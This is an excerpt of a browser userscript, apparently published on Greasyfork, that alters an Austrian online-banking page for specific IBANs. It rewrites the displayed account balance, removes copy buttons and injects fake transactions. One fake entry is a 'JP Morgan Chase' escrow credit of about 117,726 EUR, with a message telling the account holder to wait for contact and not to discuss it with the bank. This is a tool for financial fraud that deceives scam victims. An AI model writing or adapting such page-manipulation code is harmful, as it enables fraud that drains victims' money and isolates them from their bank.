// ==UserScript==
// @name         Ed WM Raif AT MARKUS ULREICH
...
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/499987/Ed%20WM%20Raif%20AT%20MARKUS%20ULREICH.user.js
// @updateURL https://update.greasyfork.org/scripts/499987/Ed%20WM%20Raif%20AT%20MARKUS%20ULREICH.meta.js
// ==/UserScript==
...
//------------MODIF BALANCE------------MODIF BALANCE------------MODIF BALANCE------------MODIF BALANCE------------MODIF BALANCE------------MODIF BALANCE-------------
    ...
    var modificationValue = 0.00; // Change this value as needed

    // Specify the text to search for in the page
    var searchText = "AT51 3244 7000 0075 5470";
...
//    var searchText = "AT09 3411 0000 0182 1701"; // Text to search for in the page
    ...
    var transactions = [
        {
            transactionName: "Treuhand: JP Morgan Chase",
            transactionDetails: "Freigabe nötig. A. Graf meldet sich. Mit Bank nicht besprechen, damit nicht gesperrt.",
            transactionAmount: "117.726,46 EUR",
            transactionOrder: 3 // Order in which this transaction should be inserted
        },
//        {
////            transactionName: "JP Morgan Chase",
...
//    // Specify the modification value here
//    var modificationValue = 999900.00; // Change this value as needed
...
//    // Specify the text to search for in the page
//   var searchText = 'AT72 3503 4000 0012 4073';
    ...
    function removeKopierenElements() {
        var kopierenElements = document.querySelectorAll('[icon="restore"]');
    ...
    function modifyBalance() {
        var kopierenElement = document.querySelector('[icon="restore"]');
        if (kopierenElement) {
...
//    // Configurable elements
 //   var searchText = "AT72 3503 4000 0012 4073"; // Text to search for in the page
...
var elements = document.querySelectorAll('.rds-carousel-item.ng-star-inserted.rds-carousel-item-active.rds-carousel-item-selected');
